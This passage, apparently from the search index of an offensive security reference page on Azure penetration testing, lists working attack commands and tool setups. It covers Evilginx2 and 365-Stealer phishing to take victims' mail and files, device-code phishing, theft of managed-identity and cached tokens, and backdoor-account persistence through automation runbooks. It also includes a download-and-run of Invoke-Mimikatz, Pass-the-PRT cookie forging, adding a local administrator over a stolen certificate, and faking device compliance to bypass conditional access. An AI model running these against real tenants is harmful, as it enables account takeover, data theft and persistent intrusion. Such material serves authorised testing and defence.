Powershell"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-az-powershell","text":"PS> $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force PS> $creds = New-Object System.Management.Automation.PSCredential (\"test@<TENANT NAME>.onmicrosoft.com\", $passwd) PS Az> Connect-AzAccount -Credential $creds PS Az> Get-AzResource PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com PS Az> Get-AzVM | fl PS Az> Get-AzWebApp | ?{$_.Kind -notmatch \"functionapp\"} PS Az> Get-AzFunctionApp PS Az> Get-AzStorageAccount | fl PS Az> Get-AzKeyVault","title":"Enumerate tenant with Az Powershell"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-az-cli","text":"PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD> PS> az vm list PS> az vm list --query \"[].[name]\" -o table PS> az webapp list PS> az functionapp list --query \"[].[name]\" -o table PS> az storage account list PS> az keyvault list","title":"Enumerate tenant with az cli"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-manually","text":"Federation with Azure AD or O365 powershell https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1 https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1 Get the Tenant ID powershell https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration","title":"Enumerate manually"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumeration-methodology","text":"# Check Azure Joined PS> dsregcmd.exe /status +----------------------------------------------------------------------+ | Device State | +----------------------------------------------------------------------+ AzureAdJoined : YES EnterpriseJoined : NO DomainJoined : NO Device Name : jumpvm # Enumerate resources PS Az> Get-AzResource # Enumerate role assignments PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>` # Get info on a role PS Az> Get-AzRoleDefinition -Name \"Virtual Machine Command Executor\" # Get info user PS AzureAD> Get-AzureADUser -ObjectId <ID> PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * # List all groups PS AzureAD> Get-AzureADGroup -All $true # Get members of a group PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>' PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName # Get Azure AD information PS> Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information # Check if there is a user logged-in to az cli PS> az ad signed-in-user show # Check AppID Alternative Names/Display Name PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \"<APP-ID>\"} | fl # Get all application objects registered using the current tenant PS AzureAD> Get-AzureADApplication -All $true # Get all details about an application PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl * # List all VM's the user has access to PS Az> Get-AzVM PS Az> Get-AzVM | fl # Get all function apps PS Az> Get-AzFunctionApp # Get all webapps PS Az> Get-AzWebApp PS Az> Get-AzWebApp | select-object Name, Type, Hostnames # List all storage accounts PS Az> Get-AzStorageAccount PS Az> Get-AzStorageAccount | fl # List all keyvaults PS Az> Get-AzKeyVault","title":"Enumeration methodology"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#phishing-with-evilginx2","text":"PS C:\\Tools> evilginx2 -p C:\\Tools\\evilginx2\\phishlets : config domain username.corp : config ip 10.10.10.10 : phishlets hostname o365 login.username.corp : phishlets get-hosts o365 Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine # copy certificate and enable the phishing PS C:\\Tools> Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt PS C:\\Tools> Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key : phishlets enable o365 # get the phishing URL : lures create o365 : lures get-url 0","title":"Phishing with Evilginx2"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#illicit-consent-grant","text":"The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. Check if users are allowed to consent to apps: PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole * Disable user consent : Users cannot grant permissions to applications. * Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant * Users can consent to all apps : allows all users to consent to any permission which doesn't require admin consent, * Custom app consent policy","title":"Illicit Consent Grant"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#register-application","text":"Login to https://portal.azure.com > Azure Active Directory Click on App registrations > New registration Enter the Name for our application Under support account types select \"Accounts in any organizational directory (Any Azure AD directory - Multitenant)\" Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is https://<DOMAIN/IP>:<PORT>/login/authorized . Click Register and save the Application ID","title":"Register Application"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#configure-application","text":"Click on Certificates & secrets Click on New client secret then enter the Description and click on Add . Save the secret 's value. Click on API permissions > Add a permission Click on Microsoft Graph > Delegated permissions Search and select the below mentioned permissions and click on Add permission Contacts.Read Mail.Read / Mail.ReadWrite Mail.Send Notes.Read.All Mailboxsettings.ReadWrite Files.ReadWrite.All User.ReadBasic.All User.Read","title":"Configure Application"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#setup-365-stealer-deprecated","text":":warning: Default port for 365-Stealer phishing is 443 Run XAMPP and start Apache Clone 365-Stealer into C:\\xampp\\htdocs\\ git clone https://github.com/AlteredSecurity/365-Stealer.git Install the requirements Python3 PHP CLI or Xampp server pip install -r requirements.txt Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache Edit C:/xampp/htdocs/yourvictims/index.php if needed Disable IP whitelisting $enableIpWhiteList = false; Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims) Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered. Client Secret (Mandatory): Secret value from the Certificates & secrets tab that we created. Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like https://<Domain/IP>/login/authorized Macros Location : Path of macro file that we want to inject. Extension in OneDrive : We can provide file extensions that we want to download from the victims account or provide * to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. Delay : Delay the request by specifying time in seconds while stealing Create a Self Signed Certificate to use HTTPS Run the application either click on the button or run this command : python 365-Stealer.py --run-app --no-ssl : disable HTTPS --port : change the default listening port --token : provide a specific token --refresh-token XXX --client-id YYY --client-secret ZZZ : use a refresh token Find the Phishing URL: go to https://<IP/Domain>:<Port> and click on Read More button or in the console.","title":"Setup 365-Stealer (Deprecated)"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#setup-vajra","text":"Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra Mitigation : Enable Do not allow user consent for applications in the \"Consent and permissions menu\".","title":"Setup Vajra"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#device-code-phish","text":"Requirements: * Azure AD / Office 365 E3 Subscription Exploitation: Import TokenTactics: PS C:\\TokenTactics> Import-Module .\\TokenTactics.psd1 Request a device code for the Azure Graph API using TokenTactics: Get-AzureToken -Client Graph Replace <REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS> in the phishing email Leave TokenTactics running in the PowerShell window and send the phishing email Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form Enjoy your Access Token & Refresh Token","title":"Device Code Phish"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#token-from-managed-identity","text":"MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT , and MSI_SECRET is an alias for IDENTITY_HEADER . Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : env Most of the time, you want a token for one of these resources: * https://storage.azure.com * https://vault.azure.net * https://graph.microsoft.com * https://management.azure.com","title":"Token from Managed Identity"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-api-via-powershell","text":"Get access_token from IDENTITY_HEADER and IDENTITY_ENDPOINT : system('curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01\" -H secret:$IDENTITY_HEADER'); . Then query the Azure REST API to get the subscription ID and more . $Token = 'eyJ0eX..' $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01' # $URI = 'https://graph.microsoft.com/v1.0/applications' $RequestParams = @{ Method = 'GET' Uri = $URI Headers = @{ 'Authorization' = \"Bearer $Token\" } } (Invoke-RestMethod @RequestParams).value # List resources and check for runCommand privileges $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01' $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'","title":"Azure API via Powershell"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-api-via-python-version","text":"IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER'] print(\"[+] Management API\") cmd = 'curl \"%s?resource=https://management.azure.com/&api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(\"Access Token: \"+json.loads(val)[\"access_token\"]) print(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"]) print(\"\\r\\n[+] Graph API\") cmd = 'curl \"%s?resource=https://graph.microsoft.com/&api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(json.loads(val)[\"access_token\"]) print(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"]) or inside a Python Function: import logging, os import azure.functions as func def main(req: func.HttpRequest) -> func.HttpResponse: logging.info('Python HTTP trigger function processed a request.') IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER'] cmd = 'curl \"%s?resource=https://management.azure.com&apiversion=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() return func.HttpResponse(val, status_code=200)","title":"Azure API via Python Version"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#get-tokens","text":":warning: The lifetime of a Primary Refresh Token is 14 days! # az cli - get tokens az account get-access-token az account get-access-token --resource-type aad-graph # or Az (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT","title":"Get Tokens"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#use-tokens","text":"Tokens contain all the claims including that for MFA and Conditional Access Az Powershell ```powershell PS C:\\Tools> $token = 'eyJ0e..' PS C:\\Tools> Connect-AzAccount -AccessToken $token -AccountId","title":"Use Tokens"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#access-token-and-graph-token","text":"PS C:\\Tools> $token = 'eyJ0eX..' PS C:\\Tools> $graphaccesstoken = 'eyJ0eX..' PS C:\\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId PS C:\\Tools> Get-AzResource","title":"Access Token and Graph Token"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#error-thisclientsubscriptionid-cannot-be-null","text":"","title":"ERROR: 'this.Client.SubscriptionId' cannot be null."},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#-the-managed-identity-has-no-rights-on-any-of-the-azure-resources-switch-to-to-graphapi","text":"* AzureAD powershell Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 $AADToken = 'eyJ0\u2026' Connect-AzureAD -AadAccessToken $AADToken -TenantId -AccountId ```","title":"---&gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#refresh-tokens","text":"https://github.com/ConstantinT/Lantern powershell Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz> Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path> Lantern.exe token --username <Username> --password <Password> Lantern.exe token --refreshtoken <RefreshToken> Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) https://github.com/rvrsh3ll/TokenTactics powershell Import-Module .\\TokenTactics.psd1 CommandType Name Version Source ----------- ---- ------- ------ Function Clear-Token 0.0.1 TokenTactics Function Dump-OWAMailboxViaMSGraphApi 0.0.1 TokenTactics Function Forge-UserAgent 0.0.1 TokenTactics Function Get-AzureToken 0.0.1 TokenTactics Function Get-TenantID 0.0.1 TokenTactics Function Open-OWAMailboxInBrowser 0.0.1 TokenTactics Function Parse-JWTtoken 0.0.1 TokenTactics Function RefreshTo-AzureCoreManagementToken 0.0.1 TokenTactics Function RefreshTo-AzureManagementToken 0.0.1 TokenTactics Function RefreshTo-DODMSGraphToken 0.0.1 TokenTactics Function RefreshTo-GraphToken 0.0.1 TokenTactics Function RefreshTo-MAMToken 0.0.1 TokenTactics Function RefreshTo-MSGraphToken 0.0.1 TokenTactics Function RefreshTo-MSManageToken 0.0.1 TokenTactics Function RefreshTo-MSTeamsToken 0.0.1 TokenTactics Function RefreshTo-O365SuiteUXToken 0.0.1 TokenTactics Function RefreshTo-OfficeAppsToken 0.0.1 TokenTactics Function RefreshTo-OfficeManagementToken 0.0.1 TokenTactics Function RefreshTo-OutlookToken 0.0.1 TokenTactics Function RefreshTo-SubstrateToken 0.0.1 TokenTactics","title":"Refresh Tokens"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens","text":"Get-AzurePasswords powershell Import-Module Microburst.psm1 Get-AzurePasswords Get-AzurePasswords -Verbose | Out-GridView","title":"Stealing Tokens"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens-from-az-cli","text":"az cli stores access tokens in clear text in accessTokens.json in the directory C:\\Users\\<username>\\.Azure azureProfile.json in the same directory contains information about subscriptions.","title":"Stealing tokens from az cli"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens-from-az-powershell","text":"Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory C:\\Users\\<username>\\.Azure It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json Users can save tokens using Save-AzContext","title":"Stealing tokens from az powershell"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#add-credentials-to-all-enterprise-applications","text":"# Add secrets PS > . C:\\Tools\\Add-AzADAppSecret.ps1 PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose # Use secrets to authenticate as Service Principal PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password) PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'","title":"Add credentials to all Enterprise Applications"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#spawn-ssh-for-azure-web-app","text":"az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>","title":"Spawn SSH for Azure Web App"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-storage-blob","text":"Blobs - *.blob.core.windows.net File Services - *.file.core.windows.net Data Tables - *.table.core.windows.net Queues - *.queue.core.windows.net","title":"Azure Storage Blob"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-blobs","text":"PS > . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1 PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net","title":"Enumerate blobs"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#sas-url","text":"Use Storage Explorer Click on Open Connect Dialog in the left menu. Select Blob container . On the Select Authentication Method page Select Shared access signature (SAS) and click on Next Copy the URL in Blob container SAS URL field. :warning: You can also use subscription (username/password) to access storage resources such as blobs and files.","title":"SAS URL"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#list-and-download-blobs","text":"PS Az> Get-AzResource PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME> PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob","title":"List and download blobs"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#runbook-automation","text":"","title":"Runbook Automation"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#create-a-runbook","text":"# Check user right for automation az extension add --upgrade -n automation az automation account list # if it doesn't return anything the user is not a part of an Automation group az ad signed-in-user list-owned-objects # If the user is not part of an \"Automation\" group. # Add him to a custom group , e.g: \"Automation Admins\" Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose # Get the role of a user on the Automation account # Contributor or higher = Can create and execute Runbooks Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT> # List hybrid workers Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> # Create a Powershell Runbook PS C:\\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\\Tools\\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose # Publish the Runbook Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose # Start the Runbook Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose","title":"Create a Runbook"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#persistence-via-automation-accounts","text":"Create a new Automation Account \"Create Azure Run As account\": Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here \u2013 https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign \"User Administrator\" and \"Subscription Owner\" rights to the automation account Eventually lose your access\u2026 Trigger the webhook with a post request to create the new user powershell $uri = \"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\" $AccountInfo = @(@{RequestBody=@{Username=\"BackdoorUsername\";Password=\"BackdoorPassword\"}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body","title":"Persistence via Automation accounts"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#virtual-machine-runcommand","text":"Requirements: * Microsoft.Compute/virtualMachines/runCommand/action # Get Public IP of VM : query the network interface PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368> PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP> # Execute Powershell script on the VM PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\Tools\\adduser.ps1' -Verbose # Connect via WinRM PS C:\\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force PS C:\\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password) PS C:\\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) PS C:\\Tools> Enter-PSSession $sess Allow anyone with \"Contributor\" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System # List available VMs PS C:\\> Get-AzureRmVM -status | where {$_.PowerState -EQ \"VM running\"} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test # Execute Powershell script on the VM PS C:\\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1 Import-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt","title":"Virtual Machine RunCommand"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#keyvault-secrets","text":"# keyvault access token curl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER # connect PS> $token = 'eyJ0..' PS> $keyvaulttoken = 'eyJ0..' PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken # query the vault and the secrets PS Az> Get-AzKeyVault PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText","title":"KeyVault Secrets"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#pass-the-prt","text":"MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on). # Run mimikatz to obtain the PRT PS> iex (New-Object Net.Webclient).downloadstring(\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\") PS> Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::cloudap\"' # Copy the PRT and KeyValue Mimikatz> privilege::debug Mimikatz> token::elevate Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect # Copy the Context, ClearKey and DerivedKey Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT> # Generate a JWT PS> Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals> $PRT_OF_USER = '...' PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \"=\"} PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER)) PS AADInternals> $ClearKey = \"XXYYZZ...\" PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne '')) PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey \u2013GetNonce eyJ0eXAiOiJKV1QiL... The <Signed JWT> (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf. Edit the Chrome cookie (F12) -> Application -> Cookies with the values: Name: x-ms-RefreshTokenCredential Value: <Signed JWT> HttpOnly: \u221a :warning: Mark the cookie with the flags HTTPOnly and Secure .","title":"Pass The PRT"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#pass-the-certificate","text":"Copy-Item -ToSession $jumpvm -Path C:\\Tools\\PrtToCertmaster.zip -Destination C:\\Users\\Username\\Documents\\username \u2013Verbose Expand-Archive -Path C:\\Users\\Username\\Documents\\username\\PrtToCert-master.zip -DestinationPath C:\\Users\\Username\\Documents\\username\\PrtToCert # Require the PRT, TenantID, Context and DerivedKey & 'C:\\Program Files\\Python39\\python.exe' C:\\Users\\Username\\Documents\\username\\PrtToCert\\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY> # PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine https://github.com/morRubin/AzureADJoinedMachinePTC Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP Main.py --usercert \"admin.pfx\" --certpass password --remoteip 10.10.10.10 python Main.py --usercert C:\\Users\\Username\\Documents\\username\\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx -- certpass AzureADCert --remoteip 10.10.10.10 --command \"cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add\"","title":"Pass The Certificate"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#intunes-administration","text":"Requirements: * Global Administrator or Intune Administrator Privilege : Get-AzureADGroup -Filter \"DisplayName eq 'Intune Administrators'\" Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT Go to Devices -> All Devices to check devices enrolled to Intune Go to Scripts and click on Add for Windows 10. Add a Powershell script Specify Add all users and Add all devices in the Assignments page. :warning: It will take up to one hour before you script is executed !","title":"Intunes Administration"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#dynamic-group-membership","text":"Get groups that allow Dynamic membership: Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} Rule example : (user.otherMails -any (_ -contains \"vendor\")) -and (user.userType -eq \"guest\") Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group Open user's profile, click on Manage Click on Resend invite and to get an invitation URL Set the secondary email powershell PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose","title":"Dynamic Group Membership"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#administrative-unit","text":"Administrative Unit can reset password of another user PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID> PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID> PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId> PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl PS C:\\Tools> $password = \"Password\" | ConvertToSecureString -AsPlainText -Force PS C:\\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \"<Username>@<TENANT NAME>.onmicrosoft.com\"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose","title":"Administrative Unit"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#deployment-template","text":"PS Az> Get-AzResourceGroup PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP # Export PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME> cat <DEPLOYMENT NAME>.json # search for hardcoded password cat <PATH TO .json FILE> | Select-String password","title":"Deployment Template"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#application-proxy","text":"# Enumerate application that have Proxy PS C:\\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}} PS C:\\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \"Finance Management System\"} PS C:\\Tools> . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1 PS C:\\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>","title":"Application Proxy"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#conditional-access","text":"Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc) Bypassing conditional access by faking device compliance powershell # AAD Internals - Making your device compliant # Get an access token for AAD join and save to cache Get-AADIntAccessTokenForAADJoin -SaveToCache # Join the device to Azure AD Join-AADIntDeviceToAzureAD -DeviceName \"SixByFour\" -DeviceType \"Commodore\" -OSVersion \"C64\" # Marking device compliant - option 1: Registering device to Intune # Get an access token for Intune MDM and save to cache (prompts for credentials) Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache # Join the device to Intune Join-AADIntDeviceToIntune -DeviceName \"SixByFour\" # Start the call back Start-AADIntDeviceIntuneCallback -PfxFileName 